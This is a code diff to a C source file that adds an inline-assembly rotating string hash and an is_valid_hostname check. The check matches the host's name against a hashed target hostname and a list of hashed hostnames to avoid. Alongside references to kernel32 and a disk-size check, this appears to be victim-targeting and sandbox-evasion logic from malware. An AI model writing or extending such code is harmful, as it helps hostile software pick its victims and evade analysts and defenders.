@@ -54,9 +54,6 @@ int get_disk_size(HMODULE hKernel32dll) {
 //     return "FR";
 // }
 
-// void v() {
-
-// }
 
 unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right) {
     unsigned int hash = 0;
@@ -72,12 +69,57 @@ unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right)
     return hash;
 }
 
-// bool is_string_matching_prefixHash(const char* str, unsigned int prefix_hash) {
-    
-// }
+bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash) {
+    bool match = true;
+    size_t str_len = strlen(str);
+    __asm__ (
+        // "push %[string]\n\t"
+        // "mov %%rsp, %%rsi\n\t"
+        "mov %[string], %%rsi\n\t"
+        "mov %[hash], %%r10d\n\t"
+        "movzx %[is_ror], %%r8d\n\t"
+        "xor %%r9d, %%r9d\n\t"
+        "mov %[strlen], %%rcx\n\t"
 
-// bool is_valid_hostname(const char* hostname) {
-//     if (is_string_matching_prefixHash(hostname, TARGET_HOSTNAME_PREFIX_HASH)) {
-//         return true;
-//     }
-// }
+    "hash_loop:\n\t"
+        "xor %%rax, %%rax\n\t"
+        "lodsb\n\t"
+        "push %%rcx\n\t"
+        "test %%r8d, %%r8d\n\t"
+        "movzx %[rotation_value], %%ecx\n\t"   
+        "jz rotate_left_%=\n\t"
+        "ror %%cl, %%r9d\n\t"              
+        "jmp rotate_end_%=\n\t"            
+    "rotate_left_%=:\n\t"
+        "rol %%cl, %%r9d\n\t"              
+    "rotate_end_%=:\n\t"
+        "pop %%rcx\n\t"
+        "add %%eax, %%r9d\n\t"            // Add AL to hash
+        "cmp %%r10d, %%r9d\n\t"           // Compare hash
+        "jz matching\n\t"
+        "cmp %%ah, %%al\n\t"
+        "jnz hash_loop\n\t"
+    "not_matching:\n\t"
+        "mov $0, %[result]\n\t"
+        "jmp end\n\t"
+    "matching:\n\t"
+        "mov $1, %[result]\n\t"
+    "end:\n\t"
+        : [result] "=r" (match)                      // Output
+        : [hash] "r" (prefix_hash.value), [string] "r" (str), [strlen] "r" (str_len), [rotation_value] "r" (prefix_hash.rotation_value), [is_ror] "m" (prefix_hash.is_rotation_right)                // Input
+        : "rax", "rcx", "rsi", "r8", "r9", "r10", "memory"  // Clobbers
+    );
+    return match;
+}
+
+bool is_valid_hostname(const char* hostname) {
+    if (is_string_matching_prefixHash(hostname, TARGET_HOSTNAME_PREFIX_HASH)) {
+        return true;
+    }
+    for (size_t i = 0; i < AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE; i++) {
+        if (is_string_matching_prefixHash(hostname, AVOIDED_HOSTNAME_PREFIX_HASHES[i])) {
+            return false;
+        }
+    }
+    return false;
+}
